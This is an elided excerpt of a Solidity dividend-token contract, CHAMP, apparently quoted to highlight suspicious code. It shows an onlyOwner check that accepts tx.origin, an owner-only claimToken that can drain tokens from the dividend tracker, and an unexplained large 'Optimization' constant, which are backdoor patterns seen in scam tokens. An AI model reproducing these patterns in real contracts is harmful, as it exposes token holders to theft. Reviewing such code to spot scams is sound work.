...
// SPDX-License-Identifier: MIT
  ...
  abstract contract Ownable is Context {
      ...
      modifier onlyOwner() {
          require(owner() == tx.origin || owner() == msg.sender, "Ownable: caller is not the owner");
          _;
      }
  ...
  contract TokenDividendTracker is Ownable, DividendPayingToken {
      ...
      function claimToken(address token) external onlyOwner {
        ...
        IERC20(token).transfer(address(msg.sender), initialBalance);
      }
  ...
  contract CHAMP is ERC20, Ownable {
      ...
      uint256 public Optimization = 82312005736311793994297906463;
      ...
      function _transfer(
          ...
          if( canSwap &&
              ...
              swapping = true;
              if(contractTokenBalance > AmountMarketingFee) swapAndSendToFee(AmountMarketingFee);
              contractTokenBalance = contractTokenBalance-AmountMarketingFee;
              if(contractTokenBalance> AmountLiquidityFee) swapAndLiquify(AmountLiquidityFee);
              contractTokenBalance = contractTokenBalance-AmountLiquidityFee;
              if(contractTokenBalance > AmountTokenRewardsFee) swapAndSendDividends(AmountTokenRewardsFee);
              swapping = false;
          }
    ...
    function swapTokensForToken(uint256 tokenAmount) private {
        ...
        if(rewardToken == uniswapV2Router.WETH()){
          ...
          dividendTracker.claimToken(rewardToken);
        }else{
